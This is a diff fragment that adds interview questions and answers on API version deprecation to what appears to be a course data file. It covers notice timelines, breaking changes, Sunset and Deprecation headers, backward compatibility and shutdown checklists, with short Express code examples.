+                                <li><strong>Feature flags:</strong> Gradual rollout of breaking changes (10% → 50% → 100%)</li>
+                                <li><strong>Shutdown:</strong> Return 410 Gone (not 404), include migration link, monitor support channels</li>
+                                <li><strong>Analytics:</strong> Track v1 usage, identify heavy users, personal outreach before shutdown</li>
+                                <li><strong>Real examples:</strong> Twitter v1 (too fast, backlash), Google+ (clean 6-month process)</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is the recommended timeline and process for deprecating an API version?",
+                                answer: "Standard deprecation timeline: 6-12 months minimum, longer for enterprise/high-usage APIs. Process: Month 0: Announce via blog, email all users, update docs, add in-app notifications. Month 1-3: Migration period - provide detailed migration guide with code examples, offer migration support/office hours. Month 4-6: Warning period - add Sunset header to responses (Sunset: Dec 31 2024), email reminders to users still on old version. Month 9: Escalation - final warning emails, personal outreach to heavy users (>1000 req/day), consider extension if major clients need more time. Month 12: Shutdown - disable old version, return 410 Gone with migration link, monitor support. Communication channels: Developer blog post (detailed announcement), email campaigns (action required), response headers (Sunset, Deprecation, Warning), dashboard banner, status page, social media. Never immediate shutdown without notice - breaks trust and integrations. Twitter API v1 deprecation (3 months) caused backlash. Google+ API (6 months) was well-received. Enterprise APIs may need 18-24 months. Track usage analytics to validate safe shutdown date (v1 requests < 1% of total)."
+                            },
+                            {
+                                question: "What changes are considered breaking vs non-breaking in API versioning?",
+                                answer: "Breaking changes (require new version): 1) Remove endpoints/fields, 2) Rename fields (created → createdAt), 3) Change field types (string → number, integer → float), 4) Make optional field required, 5) Change authentication method (API key → Bearer token), 6) Change URL structure (/api/users → /users), 7) Decrease rate limits (1000/hr → 100/hr), 8) Change error code meanings, 9) Remove/change query parameters. Non-breaking changes (can add without version bump): 1) Add new endpoints, 2) Add new optional request fields, 3) Add new response fields (clients ignore unknown fields), 4) Add new error codes, 5) Make required field optional, 6) Increase rate limits, 7) Add new optional headers, 8) Improve performance. Example breaking: v1 { id: 1, created: 1617123456 } → v2 { id: 1, createdAt: '2024-01-15...' } breaks clients accessing response.created. Example non-breaking: v1 { id: 1, name: 'Alice' } → v2 { id: 1, name: 'Alice', email: 'alice@...' } works, old clients ignore email field. Robustness principle: Add optional fields without version bump (clients should ignore unknown fields). Use semantic versioning: v2.1.0 adds fields, v3.0.0 breaks compatibility."
+                            },
+                            {
+                                question: "How do you use HTTP headers to communicate API deprecation to clients?",
+                                answer: "Standard deprecation headers: 1) Sunset header (RFC 8594): Sunset: Sat, 31 Dec 2024 23:59:59 GMT - indicates when API will be unavailable, uses HTTP date format. 2) Deprecation header: Deprecation: true or Deprecation: @1704067199 (Unix timestamp). 3) Link header: Link: <https://docs.example.com/migrate>; rel='deprecation' - points to migration guide. 4) Warning header: Warning: 299 - 'API v1 deprecated. Migrate to v2 by Dec 31. https://migrate.example.com' - 299 code for miscellaneous persistent warning. Implementation: app.use('/api/v1/*', (req, res, next) => { res.setHeader('Sunset', 'Sat, 31 Dec 2024 23:59:59 GMT'); res.setHeader('Deprecation', 'true'); res.setHeader('Link', '<https://docs.example.com/migrate>; rel=\"deprecation\"'); res.setHeader('Warning', '299 - \"Migrate by Dec 31\"'); next(); }). Client handling: const sunset = response.headers.get('Sunset'); if (sunset && new Date(sunset) < Date.now() + 90days) { alert('API deprecated in 90 days!') }. Benefits: Machine-readable (automated tools detect), standard (RFC), actionable (link to guide). All responses include these headers starting from announcement, clients can programmatically warn developers."
+                            },
+                            {
+                                question: "What strategies can you use to maintain backward compatibility during API evolution?",
+                                answer: "Backward compatibility techniques: 1) Field aliasing - include both old and new names: { createdAt: '2024...', created: '2024...', created_at: '2024...' } allows old clients to work. 2) Accept old formats - support both API key and Bearer token auth: if (req.headers['x-api-key']) { authenticateOld() } else if (req.headers.authorization) { authenticateNew() }. 3) Transform layer - convert old requests to new format internally: transformV1toV2({ user_id: 123 }) → { userId: 123 }. 4) Default values - make new required fields have defaults for old clients. 5) Deprecation with gradual removal - support old format for 12 months, then remove. 6) Additive changes only - add optional fields, don't remove or change existing. 7) Feature flags - gradual rollout: if (features.newFormat) { returnV2() } else { returnV1() }. 8) Versioned endpoints - run /v1 and /v2 in parallel, route based on URL. Example: Instead of renaming created → createdAt (breaking), include both temporarily. Tradeoff: Compatibility adds complexity (supporting multiple formats). Best practice: Use during migration period (6-12 months), then clean up old code. Don't maintain forever - technical debt accumulates. Stripe approach: Dated versions (2023-10-16) with backward-compatible changes, breaking changes require new date version."
+                            },
+                            {
+                                question: "How should you handle the final shutdown of a deprecated API version?",
+                                answer: "Final shutdown checklist: 1 month before: Send final warning email ('Last chance to migrate'), add countdown banner to dashboard, check analytics for remaining users, personal outreach to top 10 heavy users (>1000 req/day). 1 week before: Final reminder email, verify v2 stable and tested, prepare 410 Gone responses, update status page and docs. Shutdown day: Disable v1 endpoints, return 410 Gone (not 404 - permanently gone), include migration guide link in error, monitor support channels closely, update status page. Post-shutdown: Wait 30 days grace period monitoring for issues, remove v1 code from codebase, archive v1 documentation (don't delete - historical reference), post-mortem meeting. Implementation: app.use('/api/v1/*', (req, res) => { res.status(410).json({ error: { code: 'API_DEPRECATED', message: 'v1 deprecated Dec 31 2024', migration_guide: 'https://docs.example.com/migrate', support: 'api@example.com' } }) }). 410 Gone vs 404: 410 signals permanent removal (stop retrying, migrate), 404 might work at different URL. Track laggards: Monitor v1 requests after shutdown, contact users still trying. Extension policy: Only extend if critical client needs time (enterprise customer), communicate new date clearly. Don't extend indefinitely - sets bad precedent."
+                            },
+                            {
+                                question: "What can we learn from real-world API deprecation examples like Twitter and Google+?",
+                                answer: "Twitter API v1 → v1.1 (2013): Announced March, shutdown June (3 months only). Breaking changes: OAuth required for all endpoints (was optional), rate limits per-user not per-IP, changed JSON structure. Result: Too short notice, many third-party apps broke, developer backlash, some clients never recovered. Lesson: 3 months insufficient for widely-used API, caused broken integrations and lost developer trust. Google+ API shutdown (2019): Announced Oct 2018, shutdown March 2019 (6 months). Communication: Blog post, email to all users, console notifications, clear migration to alternatives (Google Sign-In, People API). Execution: Clean shutdown on announced date, 410 Gone responses, redirect to notice page, no extensions. Result: Professional process, minimal complaints. Lesson: 6+ months notice is standard, clear alternatives, stick to timeline. Key takeaways: 1) Notice period: Minimum 6 months, 12 months for enterprise, Twitter's 3 months too short, 2) Communication: Multi-channel (blog, email, headers, dashboard) like Google+, 3) Migration path: Provide clear alternative and detailed guide, 4) Support: Office hours, migration tools, personal outreach to heavy users, 5) Timeline: Set date and stick to it (Google+), don't surprise extend or cut short (Twitter). Best practices: Combine Google+'s communication approach with longer Twitter-lesson timeline (6-12 months minimum)."
+                            }
+                        ]
                     }
                 ]
             }
